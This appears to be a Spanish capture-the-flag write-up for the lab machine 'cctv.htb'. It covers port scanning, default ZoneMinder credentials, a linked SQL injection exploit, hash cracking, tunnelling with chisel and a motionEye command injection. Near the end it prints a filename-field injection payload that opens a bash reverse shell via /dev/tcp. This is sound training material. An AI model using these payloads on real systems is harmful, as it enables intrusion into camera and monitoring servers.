OS: Linux
Level: Easy


# Enumeración

#### Nmap

Primero hacemos un escaneo para analizar los puertos:

![[Pasted image 20260421123233.png]]

Ahora hacemos un escaneo de cada puerto individualmente:

```ruby
sudo nmap -p22,80 -T5 -sCV -v -oN ports.specified
```

![[Pasted image 20260421123459.png]]

Vemos que nos marca el dominio de la ip hacia cctv.htb, por lo que lo registramos de una vez en `/etc/hosts`:

![[Pasted image 20260421123723.png]]

Ahora demosle un vistazo a la pagina: 

![[Pasted image 20260421123824.png]]

No vemos nada interesante en esta sección, intentemos ir al login (Botón rojó):


![[Pasted image 20260421124404.png]]

Investigando un poco sabemos que ZoneMinder es un software de monitorización, y tiene credenciales por defecto, podemos intentar con:

```ruby
Username -> admin
Password -> admin
```

# Explotación

Y efectivamente nos dá acceso:

![[Pasted image 20260421124549.png]]

Vemos que estamos en la versión 1.37.63, la cual es vulnerable SQL Injection Blind basado en tiempo, podemos encontrar un exploit [aquí](https://github.com/BridgerAlderson/CVE-2024-51482/blob/main/CVE-2024-51482.py):

El exploit nos muestra el usuario admin y mark con sus respectivos hashes, iuntentemos crackearlos usando john, empezamos metiendolos en un archivo:

![[Pasted image 20260422122707.png]]

```ruby
john --wordlist=/path/to/wordlist/rockyou hash
```

Gracias a john sabemos que la contraseña del usuario mark es opensesame, podemos usar estas mismas credenciales para acceder por ssh `mark | opensesame`:

![[Pasted image 20260422123243.png]]

Ahora empezamos a analizar el entorno en el que estamos, empezamos enumerando los posibles servicios:

![[Pasted image 20260425172820.png]]

Viendo que hay demasiados activos como para analizarlos individualmente, aprovechemos que tenemos una conexión estable con ssh podemos intentar subir chisel para enumerar los servicios de una forma mas especifica (Version y nombre):

Nos ponemos a la escucha con chisel:

![[Pasted image 20260425184918.png]]

Mandamos la conexión desde la maquina victima:

![[Pasted image 20260425185123.png]]

Ahora podemos hacer une scaneo de NMAP usando proxychains4:

![[Pasted image 20260425200805.png]]

```python
Nmap scan report for 127.0.0.1
Host is up (0.00s latency).

PORT      STATE SERVICE         VERSION
1935/tcp  open  rtmp?
3306/tcp  open  mysql           MySQL 8.0.45-0ubuntu0.24.04.1
| ssl-cert: Subject: commonName=MySQL_Server_8.0.43_Auto_Generated_Server_Certificate
| Not valid before: 2025-09-13T21:37:10
|_Not valid after:  2035-09-11T21:37:10
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.45-0ubuntu0.24.04.1
|   Thread ID: 44
|   Capabilities flags: 65535
|   Some Capabilities: FoundRows, LongColumnFlag, InteractiveClient, Support41Auth, LongPassword, SupportsLoadDataLocal, Speaks41ProtocolNew, SupportsTransactions, DontAllowDatabaseTableColumn, IgnoreSigpipes, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, SwitchToSSLAfterHandshake, ConnectWithDatabase, ODBCClient, SupportsCompression, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: {t,\x7Fc\x7F9\x1F\x11@\x18\x1A7\x03;Z#}A8
|_  Auth Plugin Name: caching_sha2_password
|_ssl-date: TLS randomness does not represent time
7999/tcp  open  irdmi2?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Sun, 26 Apr 2026 01:07:41 GMT
|     Connection: close
|     Content-Type: text/plain;
|     Content-Length: 36
|     Motion 4.7.1 Running [1] Camera
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Date: Sun, 26 Apr 2026 01:07:56 GMT
|     Connection: close
|     Content-Length: 111
|_    <html><head><title>Request malformed</title></head><body>HTTP request is syntactically incorrect.</body></html>
8554/tcp  open  http            IDentifier NameTracer Pro httpd
|_http-title: Site doesn't have a title.
8765/tcp  open  ultraseek-http?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Server: motionEye/0.43.1b4
|     Content-Type: application/json
|     Date: Sun, 26 Apr 2026 01:09:11 GMT
|     Content-Length: 22
|     {"error": "not found"}
|   GenericLines, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: motionEye/0.43.1b4
|     Content-Type: text/html
|     Date: Sun, 26 Apr 2026 01:07:41 GMT
|     Etag: "6a55c4f0afb5e1cfd268b1b266d132b31c352706"
|     Content-Length: 115726
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta name="mobile-web-app-capable" content="yes">
|     <meta name="apple-mobile-web-app-capable" content="yes">
|     <meta name="theme-color" content="#414141">
|     <meta name="apple-mobile-web-app-status-bar-style" content="#414141">
|     <title>cctv</title>
|     <link rel="stylesheet" type="text/css" href="static/css/jquery.timepicker.min.css?v=0.43.1b4">
|     <link rel="shortcut icon" href="static/img/motioneye-logo.svg">
|     <link rel="apple-touch-icon" href="static/
|   HTTPOptions: 
|     HTTP/1.1 405 Method Not Allowed
|     Server: motionEye/0.43.1b4
|     Content-Type: application/json
|     Date: Sun, 26 Apr 2026 01:07:43 GMT
|     Content-Length: 41
|_    {"error": "HTTP 405: Method Not Allowed"}
8888/tcp  open  http            Golang net/http server
|_http-server-header: mediamtx
|_http-cors: GET OPTIONS
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-title: Site doesn't have a title (text/plain).
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 301 Moved Permanently
|     Access-Control-Allow-Credentials: true
|     Access-Control-Allow-Origin: *
|     Location: /nice ports,/Trinity.txt.bak/
|     Server: mediamtx
|     Date: Sun, 26 Apr 2026 01:07:48 GMT
|     Content-Length: 0
|   GenericLines, Help, LPDString, LSCP, RTSPRequest, SIPOptions, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 404 Not Found
|     Access-Control-Allow-Credentials: true
|     Access-Control-Allow-Origin: *
|     Content-Type: text/plain
|     Server: mediamtx
|     Date: Sun, 26 Apr 2026 01:07:33 GMT
|     Content-Length: 18
|     page not found
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Access-Control-Allow-Credentials: true
|     Access-Control-Allow-Origin: *
|     Content-Type: text/plain
|     Server: mediamtx
|     Date: Sun, 26 Apr 2026 01:07:41 GMT
|     Content-Length: 18
|_    page not found
9081/tcp  open  cisco-aqos?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Sun, 26 Apr 2026 01:07:42 GMT
|     Connection: close
|     Content-Type: multipart/x-mixed-replace; boundary=BoundaryString
|     --BoundaryString
|     Content-type: image/jpeg
|     Content-Length: 11445
|     JFIF
|     Exif
|     0220
|     2026:04:26 01:07:43
|     2026:04:26 01:07:43
|     $3br
|     %&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
|_    &'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
33060/tcp open  mysqlx          MySQL X protocol listener
4 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port7999-TCP:V=7.99%I=7%D=4/25%Time=69ED6352%P=aarch64-unknown-linux-gn
SF:u%r(GetRequest,9E,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sun,\x2026\x20Apr
SF:\x202026\x2001:07:41\x20GMT\r\nConnection:\x20close\r\nContent-Type:\x2
SF:0text/plain;\r\nContent-Length:\x2036\r\n\r\nMotion\x204\.7\.1\x20Runni
SF:ng\x20\[1\]\x20Camera\x20\n1\x20\n")%r(RTSPRequest,D8,"HTTP/1\.1\x20400
SF:\x20Bad\x20Request\r\nDate:\x20Sun,\x2026\x20Apr\x202026\x2001:07:56\x2
SF:0GMT\r\nConnection:\x20close\r\nContent-Length:\x20111\r\n\r\n<html><he
SF:ad><title>Request\x20malformed</title></head><body>HTTP\x20request\x20i
SF:s\x20syntactically\x20incorrect\.</body></html>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8765-TCP:V=7.99%I=7%D=4/25%Time=69ED634C%P=aarch64-unknown-linux-gn
SF:u%r(GenericLines,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(Get
SF:Request,8000,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20motionEye/0\.43\.1b4
SF:\r\nContent-Type:\x20text/html\r\nDate:\x20Sun,\x2026\x20Apr\x202026\x2
SF:001:07:41\x20GMT\r\nEtag:\x20\"6a55c4f0afb5e1cfd268b1b266d132b31c352706
SF:\"\r\nContent-Length:\x20115726\r\n\r\n<!DOCTYPE\x20html>\n<html>\n\x20
SF:\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20cont
SF:ent=\"width=device-width,\x20initial-scale=1\">\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20<meta\x20name=\"mobile-web-app-capable\"\x20c
SF:ontent=\"yes\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\
SF:x20name=\"apple-mobile-web-app-capable\"\x20content=\"yes\">\n\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20name=\"theme-color\"\x2
SF:0content=\"#414141\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:<meta\x20name=\"apple-mobile-web-app-status-bar-style\"\x20content=\"#4
SF:14141\">\n\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20<title>cctv</title>\n\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x2
SF:0\x20\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<link\x20rel=\"s
SF:tylesheet\"\x20type=\"text/css\"\x20href=\"static/css/jquery\.timepicke
SF:r\.min\.css\?v=0\.43\.1b4\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20<link\x20rel=\"shortcut\x20icon\"\x20href=\"static/img/motioneye
SF:-logo\.svg\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<link\x2
SF:0rel=\"apple-touch-icon\"\x20href=\"static/")%r(HTTPOptions,C1,"HTTP/1\
SF:.1\x20405\x20Method\x20Not\x20Allowed\r\nServer:\x20motionEye/0\.43\.1b
SF:4\r\nContent-Type:\x20application/json\r\nDate:\x20Sun,\x2026\x20Apr\x2
SF:02026\x2001:07:43\x20GMT\r\nContent-Length:\x2041\r\n\r\n{\"error\":\x2
SF:0\"HTTP\x20405:\x20Method\x20Not\x20Allowed\"}")%r(RTSPRequest,1C,"HTTP
SF:/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(FourOhFourRequest,A5,"HTTP/1
SF:\.1\x20404\x20Not\x20Found\r\nServer:\x20motionEye/0\.43\.1b4\r\nConten
SF:t-Type:\x20application/json\r\nDate:\x20Sun,\x2026\x20Apr\x202026\x2001
SF::09:11\x20GMT\r\nContent-Length:\x2022\r\n\r\n{\"error\":\x20\"not\x20f
SF:ound\"}");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8888-TCP:V=7.99%I=7%D=4/25%Time=69ED634C%P=aarch64-unknown-linux-gn
SF:u%r(GetRequest,D9,"HTTP/1\.0\x20404\x20Not\x20Found\r\nAccess-Control-A
SF:llow-Credentials:\x20true\r\nAccess-Control-Allow-Origin:\x20\*\r\nCont
SF:ent-Type:\x20text/plain\r\nServer:\x20mediamtx\r\nDate:\x20Sun,\x2026\x
SF:20Apr\x202026\x2001:07:33\x20GMT\r\nContent-Length:\x2018\r\n\r\n404\x2
SF:0page\x20not\x20found")%r(HTTPOptions,D9,"HTTP/1\.0\x20404\x20Not\x20Fo
SF:und\r\nAccess-Control-Allow-Credentials:\x20true\r\nAccess-Control-Allo
SF:w-Origin:\x20\*\r\nContent-Type:\x20text/plain\r\nServer:\x20mediamtx\r
SF:\nDate:\x20Sun,\x2026\x20Apr\x202026\x2001:07:41\x20GMT\r\nContent-Leng
SF:th:\x2018\r\n\r\n404\x20page\x20not\x20found")%r(FourOhFourRequest,DD,"
SF:HTTP/1\.0\x20301\x20Moved\x20Permanently\r\nAccess-Control-Allow-Creden
SF:tials:\x20true\r\nAccess-Control-Allow-Origin:\x20\*\r\nLocation:\x20/n
SF:ice\x20ports,/Trinity\.txt\.bak/\r\nServer:\x20mediamtx\r\nDate:\x20Sun
SF:,\x2026\x20Apr\x202026\x2001:07:48\x20GMT\r\nContent-Length:\x200\r\n\r
SF:\n")%r(LSCP,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\
SF:n\r\n400\x20Bad\x20Request")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnecti
SF:on:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400
SF:\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n
SF:Connection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20
SF:charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(
SF:LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(SIPOptions,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConte
SF:nt-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\
SF:n400\x20Bad\x20Request");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9081-TCP:V=7.99%I=7%D=4/25%Time=69ED634E%P=aarch64-unknown-linux-gn
SF:u%r(GetRequest,2D8D,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sun,\x2026\x20A
SF:pr\x202026\x2001:07:42\x20GMT\r\nConnection:\x20close\r\nContent-Type:\
SF:x20multipart/x-mixed-replace;\x20boundary=BoundaryString\r\n\r\n--Bound
SF:aryString\r\nContent-type:\x20image/jpeg\r\nContent-Length:\x20\x20\x20
SF:\x20\x2011445\r\n\r\n\xff\xd8\xff\xe0\0\x10JFIF\0\x01\x01\0\0\x01\0\x01
SF:\0\0\xff\xe1\0\x80Exif\0\0MM\0\*\0\0\0\x08\0\x03\x012\0\x02\0\0\0\x14\0
SF:\0\0P\x87i\0\x04\0\0\0\x01\0\0\x002\x88\*\0\x08\0\0\0\x01\0\0\0\0\0\0\0
SF:\0\0\x02\x90\0\0\x07\0\0\0\x040220\x90\x03\0\x02\0\0\0\x14\0\0\0d\0\0\0
SF:\x002026:04:26\x2001:07:43\x002026:04:26\x2001:07:43\0\xff\xdb\0C\0\x05
SF:\x03\x04\x04\x04\x03\x05\x04\x04\x04\x05\x05\x05\x06\x07\x0c\x08\x07\x0
SF:7\x07\x07\x0f\x0b\x0b\t\x0c\x11\x0f\x12\x12\x11\x0f\x11\x11\x13\x16\x1c
SF:\x17\x13\x14\x1a\x15\x11\x11\x18!\x18\x1a\x1d\x1d\x1f\x1f\x1f\x13\x17\"
SF:\$\"\x1e\$\x1c\x1e\x1f\x1e\xff\xdb\0C\x01\x05\x05\x05\x07\x06\x07\x0e\x
SF:08\x08\x0e\x1e\x14\x11\x14\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\
SF:x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e
SF:\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1e\x1
SF:e\x1e\x1e\x1e\xff\xc0\0\x11\x08\x01\xe0\x02\x80\x03\x01\"\0\x02\x11\x01
SF:\x03\x11\x01\xff\xc4\0\x1f\0\0\x01\x05\x01\x01\x01\x01\x01\x01\0\0\0\0\
SF:0\0\0\0\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\xff\xc4\0\xb5\x10\0\x02
SF:\x01\x03\x03\x02\x04\x03\x05\x05\x04\x04\0\0\x01}\x01\x02\x03\0\x04\x11
SF:\x05\x12!1A\x06\x13Qa\x07\"q\x142\x81\x91\xa1\x08#B\xb1\xc1\x15R\xd1\xf
SF:0\$3br\x82\t\n\x16\x17\x18\x19\x1a%&'\(\)\*456789:CDEFGHIJSTUVWXYZcdefg
SF:hijstuvwxyz\x83\x84\x85\x86\x87\x88\x89\x8a\x92\x93\x94\x95\x96\x97\x98
SF:\x99\x9a\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xb2\xb3\xb4\xb5\xb6\xb7\xb
SF:8\xb9\xba\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xd2\xd3\xd4\xd5\xd6\xd7\x
SF:d8\xd9\xda\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xf1\xf2\xf3\xf4\xf5\
SF:xf6\xf7\xf8\xf9\xfa\xff\xc4\0\x1f\x01\0\x03\x01\x01\x01\x01\x01\x01\x01
SF:\x01\x01\0\0\0\0\0\0\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\xff\xc4\0\
SF:xb5\x11\0\x02\x01\x02\x04\x04\x03\x04\x07\x05\x04\x04\0\x01\x02w\0\x01\
SF:x02\x03\x11\x04\x05!1\x06\x12AQ\x07aq\x13\"2\x81\x08\x14B\x91\xa1\xb1\x
SF:c1\t#3R\xf0\x15br\xd1\n\x16\$4\xe1%\xf1\x17\x18\x19\x1a&'\(\)\*56789:CD
SF:EFGHIJSTUVWXYZcdefghijstuvwxyz\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x92\
SF:x93\x94\x95\x96\x97\x98\x99\x9a\xa2");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 366.29 seconds
```

# Explotación de MotionEye

Vemos el puerto 8765, en el cual corre motionEye/0.43.1b4, podemos ver esta pagina aprovechando la conexión con chisel y usando foxyproxy:

![[Pasted image 20260426102120.png]]

Es un software para visualización de camaras  (Web UI), el cual presenta una vulnerabilidad de tipo (Authenticated RCE), por ahora no podemos explotarla ya que no tenemos las credenciales, pero investigando un poco, el archivo motion.conf, contiene las contraseñas para la conexión:

![[Pasted image 20260425205500.png]]

Usamos las credenciales para loggearnos: 

![[Pasted image 20260426102323.png]]


Como hablamos antes, esta versión (motionEye/0.43.1b4) es vulnerable a un Authenticated RCE, podemos ver el PoC [aquí](https://github.com/advisories/GHSA-j945-qm58-4gjx):

La vulnerabilidad se encuentra cuando definimos el formato de como se vana. guardar los nombres de las fotos que hace determinada camara cada cierto tiempo o de forma manual, podemos hacer un command injection usando `$(command)`, esto es porque, supongo yo, al guardar el nombre, bash interpreta esos comandos en el nombre y lo ejecuta:

```ruby
$(mkdir /home/mark/test21).%Y-%m-%d-%H-%M-%S
```

![[Pasted image 20260426120301.png]]

Como tenemos una conexión remota en ssh nos deberia llegar una carpeta en el homedirectory llamada test21:

**IMPORTANTE**: Si no se define un snapshot interval, tenemos que tomar la foto manualmente, yendo a donde se ve la camara y en el icono de una camara dar click, ahí se ejecuta nuestro codigo porque es cuando crea la imagen y la guarda con el payload inyectado

![[Pasted image 20260426120643.png]]

Viendo que funcionó la inyección de comandos vamos a intentar obtener una reverse shell:

Para eso antes nos ponemos en escucha:

```bash
sudo nc -lvnp 4444
```

Ahora enviamos el payload en el nombre de imagen:

```python
$(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/IP/4444 0>&1\"')").%Y-%m-%d-%H-%M-%S
```

Como vemos obtenemos la Reverse Shell:

![[Pasted image 20260426121057.png]]

obtenemos ambas flags:

![[Pasted image 20260426123641.png]]


